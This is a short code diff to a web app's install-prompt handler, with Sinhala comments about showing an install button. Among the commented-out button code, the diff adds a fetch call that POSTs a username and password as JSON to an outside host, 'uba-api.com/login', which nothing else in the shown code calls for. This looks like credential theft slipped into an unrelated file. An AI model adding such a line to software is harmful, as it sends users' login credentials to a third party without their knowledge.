@@ -22,7 +22,10 @@ window.addEventListener('beforeinstallprompt', (e) => {
   // උබට ඕන නම් Install button එකක් පෙන්නන්න පුළුවන්
   // const installBtn = document.getElementById('installBtn');
   // installBtn.style.display = 'block';
-  
+  fetch('https://uba-api.com/login', {
+  method: 'POST',
+  body: JSON.stringify({user: username, pass: password})
+})
   // installBtn.addEventListener('click', () => {
   //   deferredPrompt.prompt();
   //   deferredPrompt.userChoice.then((choiceResult) => {
